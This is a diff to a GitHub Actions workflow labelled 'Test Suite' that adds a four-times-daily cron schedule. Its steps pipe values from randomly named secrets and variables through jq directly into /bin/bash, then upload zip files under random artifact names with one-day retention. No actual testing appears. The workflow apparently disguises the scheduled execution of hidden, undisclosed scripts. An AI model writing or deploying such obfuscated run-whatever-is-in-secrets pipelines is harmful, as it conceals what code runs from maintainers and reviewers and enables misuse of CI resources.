@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 5,11,17,23 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,18 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          kdqd6: ${{ secrets.kdqd6 }}
+          w778: ${{ secrets.w778 }}
         run: |
-          printf '%s' "$kdqd6" | jq -r .pyy4913 | /bin/bash
-          echo $dcv1860 | jq -r .q586 | /bin/bash
-          echo $ujywq04 | jq -r .n49 | /bin/bash
-          printf '%s' "$php4" | jq -r .fpm46436 | /bin/bash
-          printf '%s' "$yro036" | jq -r .cjf50 | /bin/bash
-          printf '%s' "$ouspj17" | jq -r .hd1 | /bin/bash
+          printf '%s' "$w778" | jq -r .yawl00 | /bin/bash
+          printf '%s' "$b9353" | jq -r .bihn7975 | /bin/bash
+          echo $ytdsz3660 | jq -r .b93659 | /bin/bash
+          echo $nifa742 | jq -r .eem15 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: XRIQ9Elf
+          name: La4zFjSK
           path: "*.zip"
           retention-days: 1
